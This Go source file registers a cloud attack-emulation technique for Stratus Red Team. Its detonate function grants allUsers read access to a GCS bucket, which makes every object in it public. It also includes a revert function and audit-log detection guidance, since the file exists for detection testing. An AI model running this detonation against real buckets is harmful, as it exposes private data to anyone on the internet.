package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	storagev1 "google.golang.org/api/storage/v1"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.exfiltration.backdoor-gcs-bucket",
		FriendlyName: "Backdoor a GCS Bucket via Overly Permissive IAM Policy",
		Description: `
Grants public read access to a GCS bucket by adding an IAM binding that allows
<code>allUsers</code> to read all objects. This simulates an attacker who has
compromised a service account with Storage Admin rights and uses it to exfiltrate
data by making the bucket publicly accessible.

Warm-up:

- Create a private GCS bucket with 3 test objects

Detonation:

- Add an IAM binding granting <code>roles/storage.objectViewer</code> to
  <code>allUsers</code> on the bucket, making all objects publicly readable

Revert:

- Remove the <code>allUsers</code> IAM binding from the bucket

References:

- https://cloud.google.com/storage/docs/access-control/iam
- https://cloud.google.com/storage/docs/json_api/v1/buckets/setIamPolicy
- https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/
- https://www.praetorian.com/blog/cloud-data-exfiltration-via-gcp-storage-buckets-and-how-to-prevent-it/
`,
		Detection: `
Identify when a GCS bucket IAM policy is modified to grant access to
<code>allUsers</code> or <code>allAuthenticatedUsers</code> by monitoring for
<code>storage.setIamPermissions</code> events in GCP Data Access audit logs where
the request includes a binding with member <code>allUsers</code>.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func newStorageService(ctx context.Context, providers stratus.CloudProviders) (*storagev1.Service, error) {
	svc, err := storagev1.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create Storage client: %w", err)
	}
	return svc, nil
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	ctx := context.Background()

	svc, err := newStorageService(ctx, providers)
	if err != nil {
		return err
	}

	policy, err := svc.Buckets.GetIamPolicy(bucketName).Do()
	if err != nil {
		return fmt.Errorf("failed to get bucket IAM policy for %s: %w", bucketName, err)
	}

	policy.Bindings = append(policy.Bindings, &storagev1.PolicyBindings{
		Role:    "roles/storage.objectViewer",
		Members: []string{"allUsers"},
	})

	log.Printf("Granting allUsers:roles/storage.objectViewer on bucket %s\n", bucketName)
	_, err = svc.Buckets.SetIamPolicy(bucketName, policy).Do()
	if err != nil {
		return fmt.Errorf("failed to set bucket IAM policy for %s: %w", bucketName, err)
	}

	log.Printf("Successfully backdoored bucket %s — all objects are now publicly readable\n", bucketName)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	ctx := context.Background()

	svc, err := newStorageService(ctx, providers)
	if err != nil {
		return err
	}

	policy, err := svc.Buckets.GetIamPolicy(bucketName).Do()
	if err != nil {
		return fmt.Errorf("failed to get bucket IAM policy for %s: %w", bucketName, err)
	}

	filtered := make([]*storagev1.PolicyBindings, 0, len(policy.Bindings))
	for _, b := range policy.Bindings {
		if b.Role != "roles/storage.objectViewer" {
			filtered = append(filtered, b)
			continue
		}
		// Keep the binding but remove the allUsers member if other members exist.
		members := make([]string, 0, len(b.Members))
		for _, m := range b.Members {
			if m != "allUsers" {
				members = append(members, m)
			}
		}
		if len(members) > 0 {
			b.Members = members
			filtered = append(filtered, b)
		}
	}

	policy.Bindings = filtered
	log.Printf("Removing allUsers:roles/storage.objectViewer from bucket %s\n", bucketName)
	_, err = svc.Buckets.SetIamPolicy(bucketName, policy).Do()
	if err != nil {
		return fmt.Errorf("failed to revert bucket IAM policy for %s: %w", bucketName, err)
	}

	log.Printf("Successfully removed public access from bucket %s\n", bucketName)
	return nil
}
